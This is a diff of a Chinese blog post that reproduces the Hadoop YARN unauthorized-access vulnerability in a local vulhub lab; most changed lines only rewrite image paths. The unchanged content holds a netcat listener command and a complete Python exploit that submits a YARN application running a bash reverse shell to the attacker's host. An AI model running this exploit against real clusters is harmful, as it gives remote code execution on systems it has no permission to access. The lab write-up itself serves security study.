@@ -31,15 +31,15 @@ document.addEventListener("pjax:success", initScrollReveal);
 <meta property="og:site_name" content="丘丘人之大都督の私货">
 <meta property="og:description" content="hadoop未授权访问漏洞复现有一说一复现这玩意儿单纯只是想在hadoop开课前学会日hadoop，哦我这该死的强迫症(doge) 环境vulhub摆烂 cd vulhub&#x2F;hadoop&#x2F;unauthorized-yarn进入目录 docker-compose up -d开启环境  浏览器访问http:&#x2F;&#x2F;127.0.0.1:8088(环境默认映射到8088端口，也可以在docker-compos">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="f:/MyHexo/source_posts/hadoop未授权访问复现/image-20221020210037144.png">
-<meta property="og:image" content="f:/MyHexo/source_posts/hadoop未授权访问复现/image-20221020211738316.png">
-<meta property="og:image" content="f:/MyHexo/source_posts/hadoop未授权访问复现/image-20221020212402645.png">
+<meta property="og:image" content="https://github.com/w0r1i0g1ht/w0r1i0g1ht.github.io/blob/main/2022/10/20/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%8E%B0/image-20221020210037144.png?raw=true">
+<meta property="og:image" content="https://github.com/w0r1i0g1ht/w0r1i0g1ht.github.io/blob/main/2022/10/20/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%8E%B0/image-20221020211738316.png?raw=true">
+<meta property="og:image" content="https://github.com/w0r1i0g1ht/w0r1i0g1ht.github.io/blob/main/2022/10/20/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%8E%B0/image-20221020212402645.png?raw=true">
 <meta property="article:published_time" content="2022-10-20T12:54:58.000Z">
-<meta property="article:modified_time" content="2022-10-20T13:29:23.429Z">
+<meta property="article:modified_time" content="2022-10-20T13:49:44.791Z">
 <meta property="article:author" content="丘丘人之大都督">
 <meta property="article:tag" content="hadoop">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="f:/MyHexo/source_posts/hadoop未授权访问复现/image-20221020210037144.png"><script>(function() {
+<meta name="twitter:image" content="https://github.com/w0r1i0g1ht/w0r1i0g1ht.github.io/blob/main/2022/10/20/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%8E%B0/image-20221020210037144.png?raw=true"><script>(function() {
   const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
   const setting = localStorage.getItem('darken-mode') || 'auto'
   if (setting === 'dark' || (prefersDark && setting !== 'light'))
@@ -59,15 +59,15 @@ IconifyProviders = {
 <p>环境vulhub摆烂</p>
 <p><code>cd vulhub/hadoop/unauthorized-yarn</code>进入目录</p>
 <p><code>docker-compose up -d</code>开启环境</p>
-<p><img src="F:\MyHexo\source_posts\hadoop未授权访问复现\image-20221020210037144.png" alt="image-20221020210037144" loading="lazy"></p>
+<p><img src="https://github.com/w0r1i0g1ht/w0r1i0g1ht.github.io/blob/main/2022/10/20/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%8E%B0/image-20221020210037144.png?raw=true" alt="image-20221020210037144" loading="lazy"></p>
 <p>浏览器访问<code>http://127.0.0.1:8088</code>(环境默认映射到8088端口，也可以在docker-compose.yml里改)</p>
-<p><img src="F:\MyHexo\source_posts\hadoop未授权访问复现\image-20221020211738316.png" alt="image-20221020211738316" loading="lazy"></p>
+<p><img src="https://github.com/w0r1i0g1ht/w0r1i0g1ht.github.io/blob/main/2022/10/20/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%8E%B0/image-20221020211738316.png?raw=true" alt="image-20221020211738316" loading="lazy"></p>
 <p>确认环境正常后，kali开启监听<code>nc -lvp 9999</code></p>
 <p>然后就可以上exp了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target = &#x27;http://127.0.0.1:8088/&#x27;</span><br><span class="line">lhost = &#x27;192.168.0.1&#x27; # put your local host ip here, and listen at port 9999</span><br><span class="line"></span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;application-id&#x27;: app_id,</span><br><span class="line">    &#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class="line">    &#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">        &#x27;commands&#x27;: &#123;</span><br><span class="line">            &#x27;command&#x27;: &#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
 
 <p>成功反弹shell</p>
-<p><img src="F:\MyHexo\source_posts\hadoop未授权访问复现\image-20221020212402645.png" alt="image-20221020212402645" loading="lazy"></p>
+<p><img src="https://github.com/w0r1i0g1ht/w0r1i0g1ht.github.io/blob/main/2022/10/20/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%8E%B0/image-20221020212402645.png?raw=true" alt="image-20221020212402645" loading="lazy"></p>
 <p>下附漏洞原理</p>
 <p><a target="_blank" rel="noopener" href="http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf">http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf</a></p>
 <p>有兴趣的大佬可以去了解一下漏洞原理，这玩意儿全英文看的我头皮发麻。。。</p>
